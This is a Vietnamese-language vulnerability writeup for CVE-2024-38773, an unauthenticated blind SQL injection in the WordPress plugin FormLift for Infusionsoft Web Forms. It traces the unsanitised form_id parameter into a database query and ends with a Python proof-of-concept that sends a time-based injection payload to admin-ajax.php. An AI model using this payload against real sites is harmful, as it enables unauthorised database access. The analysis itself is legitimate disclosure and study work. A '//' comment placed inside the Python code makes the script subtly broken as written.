---
layout: post
title:  "CVE-2024-38773 - Unauthenticated Blind SQL Injection Analysis"
date:   2025-10-30 21:44:56 +0700
categories: wordpress
---
# Info:

Type: Blind SQL Injection

Plugin Name: **FormLift for Infusionsoft Web Forms**

Version: < 7.5.18

**Base Score:** [**9.8 CRITICAL**](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2024-38773&vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1&source=NIST)

**Vector:**  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H


WPScan: [WPSCAN](https://wpscan.com/vulnerability/907f2dfb-90eb-4420-a845-b7260e64ea45/)

# PoC:
Cài đặt wordpress và plugin xem [tại đây](https://t0t0r0o.github.io/writeups/wordpress/2025/10/29/setup.html)

Tại hàm `formlift_submitV2` trong file `/wp-content/plugins/formlift/modules/form/submit.php`, phát hiện tham số `$formId` được nhận trực tiếp từ `$_POST[’form_id’]` mà không thực hiện lọc dữ liệu

![image.png]({{ site.url }}/assets/images/CVE-2024-38773/image-1.png)

Sau khi biến `$formId`  được gán dữ liệu, hàm `do_acction` sẽ gọi đến  hook **`formlift_before_submit`.** Khi `do_action()` được gọi, mọi hàm đã đăng ký với hook đó đều sẽ được thực thi. 

Kiểm tra trong source code, phát hiện hàm **`formlift_before_submit`**được đăng kí xử lý khi `do_action( 'formlift_before_submit', $formId );` được gọi. 

![image.png]({{ site.url }}/assets/images/CVE-2024-38773/image-2.png)

Hàm **`formlift_before_submit`** nhận vào tham số `formID` với giá trị được truyền vào từ hàm `do_action(…)`. Biến `formId` được truyền trực tiếp  vào hàm query dữ liệu `formlift_get_form_impressions`

![image.png]({{ site.url }}/assets/images/CVE-2024-38773/image-3.png)

PoC check

```python
import requests
from datetime import datetime, timezone
import time

url = "http://localhost:8080/wp-admin/admin-ajax.php"

data = {
    "action": "formlift_submit_form",
    "form_id": "1 OR IF(MID(@@version,1,1)=8,sleep(2),1)=2" // check version 8
}

# Record start time (timezone-aware)
start_dt = datetime.now(timezone.utc)
start_ts = time.time()
print(f"Request start: {start_dt.isoformat()} (UTC)")

response = requests.post(url,  data=data)

# Record end time and compute duration
end_dt = datetime.now(timezone.utc)
end_ts = time.time()
duration_ms = (end_ts - start_ts) * 1000
print(f"Request end:   {end_dt.isoformat()} (UTC)")
print(f"Duration: {duration_ms:.2f} ms | Status: {response.status_code}")

print("--- response body ---")
print(response.text)
```

![image.png]({{ site.url }}/assets/images/CVE-2024-38773/image-4.png)